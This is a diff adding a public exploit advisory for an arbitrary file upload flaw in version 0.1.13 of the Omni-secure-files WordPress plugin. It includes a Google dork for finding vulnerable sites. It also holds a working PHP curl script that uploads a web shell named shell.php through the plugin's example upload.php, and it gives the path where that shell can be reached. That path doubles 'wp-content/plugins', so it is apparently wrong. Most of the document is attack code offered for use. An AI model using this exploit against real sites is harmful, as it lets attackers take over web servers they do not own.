@@ -1,0 +1,27 @@
+# Exploit Title: Wordpress Omni-secure-files 0.1.13 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/omni-secure-files/
+# Date: 07/06/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage: http://omni-secure.com/
+# Software Link: http://downloads.wordpress.org/plugin/omni-secure-files.zip
+# Version: 0.1.13
+
+Maybe some trash files, but page upload.php in folder "examples" is vulnerable to Remote File Upload. Code :
+
+<?php
+$u="whatelse.php";
+$c = curl_init("http://server/wp-content/plugins/omni-secure-files/plupload/examples/upload.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('file'=>"@$u",'name'=>"shell.php"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+
+Shell could be found at :
+	http://server/wp-content/plugins/wp-content/plugins/omni-secure-files/plupload/examples/uploads/shell.php
+	
+#########################################################################################
